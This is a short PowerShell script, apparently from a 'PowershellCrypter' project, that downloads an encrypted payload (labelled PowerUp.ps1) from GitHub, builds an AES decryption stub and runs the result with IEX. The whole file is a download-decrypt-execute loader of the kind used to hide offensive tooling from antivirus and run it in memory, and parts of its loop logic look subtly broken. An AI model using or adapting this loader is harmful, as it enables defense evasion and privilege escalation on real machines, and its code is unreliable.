#decrypt an already encrypted script(PowerUp.ps1)
${8}=(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/DenFox93/PowershellCrypter/main/examples/file1 ');

$stub_template = ''
for ($i = 0; $i -le 10; $i++) {
        $code_alternatives  = @()
        $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $code_alternatives += '${3} = {1} + "`r`n"

        $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+'CBC' + "`r`n"
        $code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+'Zeros' + "`r`n"
        $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $code_alternatives += '${4}.KeySize = '+ '256' + "`n" + '${4}.Key = ${3}' + "`r`n"
        $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $code_alternatives += '${4}.Dispose()' + "`r`n"
        $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${6}).Trim([char]0);' + "`r`n"
        $stub_template += $code_alternatives -join ''

        $stub_template += 'IEX' +'(${8})' + "`r`n"

        $b64key=${8}.substring(0,44);
        $b64encrypted=${8}.substring(44);
        $code = $stub_template -f $b64encrypted, $b64key
}
